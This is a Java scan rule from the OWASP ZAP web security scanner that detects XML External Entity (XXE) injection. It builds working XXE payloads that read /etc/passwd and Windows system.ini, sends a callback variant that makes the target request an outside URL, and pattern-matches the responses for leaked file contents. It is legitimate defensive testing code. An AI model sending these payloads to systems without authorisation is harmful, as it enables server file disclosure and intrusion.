/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.security.SecureRandom;
import java.text.MessageFormat;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpHeader;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.callback.ExtensionCallback;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 *
 * @author yhawke (2104)
 */
public class XxeScanRule extends AbstractAppPlugin implements ChallengeCallbackPlugin {

    private static final String MESSAGE_PREFIX = "ascanbeta.xxe.";
    private static final int PLUGIN_ID = 90023;

    // Get the correct vulnerability description from WASC
    private static final Vulnerability vuln = Vulnerabilities.getVulnerability("wasc_43");
    private static final int CHALLENGE_LENGTH = 16;

    // Payload built on examples retrieved in:
    // https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    //
    private static final String ATTACK_ENTITY = "&zapxxe;";

    static final String ATTACK_HEADER =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ELEMENT foo ANY >\n"
                    + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
                    + "]>\n";

    protected static final String ATTACK_BODY = "<foo>" + ATTACK_ENTITY + "</foo>";

    // XML standard from W3C Consortium
    // ---------------------------------------------
    // STag ::= '<' Name (S Attribute)* S? '>'
    // NameStartChar ::= ":" | [A-Z] | "_" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] |
    // [#x370-#x37D] | [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] |
    // [#x3001-#xD7FF] | [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]
    // NameChar ::= NameStartChar | "-" | "." | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]
    // Name ::= NameStartChar (NameChar)*
    // S ::= (0x20 0x09 0x0d 0x0a)+ in Java (\s)
    // Attribute ::= Name Eq AttValue
    // Eq ::= S? '=' S?
    // AttValue ::= '"' ([^<&"] | Reference)* '"' |  "'" ([^<&'] | Reference)* "'"
    // ----------------------------------------------
    private static final String tagRegex =
            "\\<[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*[^\\>]*\\>((?:\\<\\!\\[CDATA\\[(?:.(?<!\\]\\]>))*\\]\\]>)|(?:[^\\<\\&]*))\\<\\/[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*\\>";
    private static final Pattern tagPattern = Pattern.compile(tagRegex);

    // Local targets for local file inclusion
    private static final String[] LOCAL_FILE_TARGETS = {
        "file:///etc/passwd", "file:///c:/Windows/system.ini", "file:///d:/Windows/system.ini"
    };

    private static final Pattern[] LOCAL_FILE_PATTERNS = {
        Pattern.compile("root:.:0:0"),
        Pattern.compile("\\[drivers\\]"),
        Pattern.compile("\\[drivers\\]")
    };

    private static final String xmlHeaderRegex = "<\\?xml.*?\\?>";
    private static final Pattern xmlHeaderPattern =
            Pattern.compile(xmlHeaderRegex, Pattern.CASE_INSENSITIVE);

    // API for the specific challenge/response model
    // Should be a common object for all this scan rule's instances
    private static XxeCallbackImplementor callbackImplementor = new XxeCallbackImplementor();

    // Logger instance
    private static final Logger log = Logger.getLogger(XxeScanRule.class);

    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        if (vuln != null) {
            return vuln.getDescription();
        }
        return "Failed to load vulnerability description from file";
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }

        return "Failed to load vulnerability solution from file";
    }

    @Override
    public String getReference() {
        if (vuln != null) {
            StringBuilder sb = new StringBuilder();
            for (String ref : vuln.getReferences()) {
                if (sb.length() > 0) {
                    sb.append('\n');
                }

                sb.append(ref);
            }

            return sb.toString();
        }

        return "Failed to load vulnerability reference from file";
    }

    @Override
    public int getCweId() {
        return 611;
    }

    @Override
    public int getWascId() {
        return 43;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    /**
     * Scan rule to check for XXE vulnerabilities. It checks both for local and remote using the ZAP
     * API and also a new model based on parameter substitution
     */
    @Override
    public void scan() {
        // Prepare the message
        HttpMessage msg = getBaseMsg();
        String contentType = msg.getRequestHeader().getHeader(HttpHeader.CONTENT_TYPE);
        String payload = null;

        // first check if it's an XML otherwise it's useless...
        if ((contentType != null) && (contentType.contains("xml"))) {

            // Check #1 : XXE Remote File Inclusion Attack
            // ------------------------------------------------------
            // This attack is described in
            // https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
            // using an external bouncing site, in this case we use
            // the ZAP API as a server for the vulnerability check
            // using a challenge/response model based on a random string

            // Skip XXE Remote File Inclusion Attack when callback extension is not available.
            if (ChallengeCallbackImplementor.getExtensionCallback() != null) {
                String challenge = randomString(CHALLENGE_LENGTH);

                try {
                    // Prepare the attack message
                    msg = getNewMsg();
                    payload = getCallbackAttackPayload(challenge);
                    msg.setRequestBody(payload);

                    // Register the callback for future actions
                    callbackImplementor.registerCallback(challenge, this, msg);

                    // All we need has been done...
                    sendAndReceive(msg);

                } catch (IOException ex) {
                    // Do not try to internationalise this.. we need an error message in any event..
                    // if it's in English, it's still better than not having it at all.
                    log.warn(
                            "XXE Injection vulnerability check failed for payload ["
                                    + payload
                                    + "] due to an I/O error",
                            ex);
                }
            }

            // Check if we've to do only basic analysis (only remote should be done)...
            if (this.getAttackStrength() == AttackStrength.LOW) {
                return;
            }

            // Check #2 : XXE Local File Reflection Attack
            localFileReflectionAttack(getNewMsg());

            // Check if we've to do only medium sized analysis
            // (only remote and reflected will be done)
            if (this.getAttackStrength() == AttackStrength.MEDIUM) {
                return;
            }

            // Exit if the scan has been stopped
            if (isStop()) {
                return;
            }

            // Check #3 : XXE Local File Inclusion Attack
            localFileInclusionAttack(getNewMsg());
        }
    }

    /**
     * Local File Reflection Attack substitutes every attribute in the original XML request with a
     * fake entity which includes a sensitive local file. The attack is repeated for every file
     * listed in the LOCAL_FILE_TARGETS. The response returned is pattern matched against
     * LOCAL_FILE_PATTERNS. An alert is raised when a match is found.
     *
     * @param msg new HttpMessage with the same request as the base. This is used to build the
     *     attack payload.
     */
    private void localFileReflectionAttack(HttpMessage msg) {
        String payload = null;
        try {
            String requestBody = createLfrPayload(msg.getRequestBody().toString());
            for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                String localFile = LOCAL_FILE_TARGETS[idx];
                payload = MessageFormat.format(requestBody, localFile);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
                String response = msg.getResponseBody().toString();
                Matcher matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
                if (matcher.find()) {
                    newAlert()
                            .setConfidence(Alert.CONFIDENCE_MEDIUM)
                            .setAttack(payload)
                            .setEvidence(matcher.group())
                            .setMessage(msg)
                            .raise();
                }
                if (isStop()) {
                    return;
                }
            }
        } catch (IOException ex) {
            log.warn(
                    "XXE Injection vulnerability check failed for payload ["
                            + payload
                            + "] due to an I/O error",
                    ex);
        }
    }

    /**
     * Local File Inclusion Attack is described in
     * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing. The
     * attack builds a payload for every file listed in LOCAL_FILE_TARGETS with the ATTACK_HEADER
     * and the ATTACK_BODY. The response returned is pattern matched against LOCAL_FILE_PATTERNS. An
     * alert is raised when a match is found.
     *
     * <p>This situation is very uncommon because it works only in case of a bare XML parser which
     * execute the content and then returns the content almost untouched (maybe because it applies
     * an XSLT or query it using XPath and give back the result)
     *
     * @param msg new HttpMessage with the same request as the base. This is used to build the
     *     attack payload.
     */
    private void localFileInclusionAttack(HttpMessage msg) {
        String payload = null;
        try {
            for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                String localFile = LOCAL_FILE_TARGETS[idx];
                payload = MessageFormat.format(ATTACK_HEADER + ATTACK_BODY, localFile);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
                String response = msg.getResponseBody().toString();
                Matcher matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
                if (matcher.find()) {
                    newAlert()
                            .setConfidence(Alert.CONFIDENCE_MEDIUM)
                            .setAttack(payload)
                            .setEvidence(matcher.group())
                            .setMessage(msg)
                            .raise();
                }
                if (isStop()) {
                    return;
                }
            }
        } catch (IOException ex) {
            // Do not try to internationalise this.. we need an error message in any event..
            // if it's in English, it's still better than not having it at all.
            log.warn(
                    "XXE Injection vulnerability check failed for payload ["
                            + payload
                            + "] due to an I/O error",
                    ex);
        }
    }

    /**
     * Notification for a successful rule execution
     *
     * @param challenge the challenge callback that has been used
     * @param targetMessage the original message sent to the target containing the callback
     */
    @Override
    public void notifyCallback(String challenge, HttpMessage targetMessage) {
        if (challenge != null) {

            String evidence = callbackImplementor.getCallbackUrl(challenge);

            newAlert()
                    .setConfidence(Alert.CONFIDENCE_MEDIUM)
                    .setAttack(getCallbackAttackPayload(challenge))
                    .setEvidence(evidence)
                    .setMessage(targetMessage)
                    .raise();
        }
    }

    private String getCallbackAttackPayload(String challenge) {
        String message = ATTACK_HEADER + ATTACK_BODY;
        return MessageFormat.format(message, callbackImplementor.getCallbackUrl(challenge));
    }

    /**
     * Get a randomly built string with exactly lenght chars
     *
     * @param length the number of chars of this string
     * @return a string element containing exactly "lenght" characters
     */
    private String randomString(int length) {
        SecureRandom rand = new SecureRandom();
        StringBuilder result = new StringBuilder(length);
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        for (int i = 0; i < length; i++) {
            result.append(alphabet.charAt(rand.nextInt(alphabet.length())));
        }

        return result.toString();
    }

    /**
     * Only for use in unit tests
     *
     * @param extCallback
     */
    protected void setExtensionCallback(ExtensionCallback extCallback) {
        ChallengeCallbackImplementor.setExtensionCallback(extCallback);
    }

    protected static void unload() {
        if (ChallengeCallbackImplementor.getExtensionCallback() != null) {
            ChallengeCallbackImplementor.getExtensionCallback()
                    .removeCallbackImplementor(callbackImplementor);
        }
    }

    static String createLfrPayload(String requestBody) {
        StringBuilder sb = new StringBuilder(ATTACK_HEADER);

        // Remove original xml header
        Matcher headerMatcher = xmlHeaderPattern.matcher(requestBody);
        requestBody = headerMatcher.replaceAll("");

        // Replace all values in Elements with Attack Entity
        Matcher matcher = tagPattern.matcher(requestBody);
        int endIdx = 0;

        while (matcher.find()) {
            sb.append(requestBody.substring(endIdx, matcher.start(1)));
            sb.append(ATTACK_ENTITY);
            endIdx = matcher.end(1);
        }
        sb.append(requestBody.substring(endIdx));
        return sb.toString();
    }
}
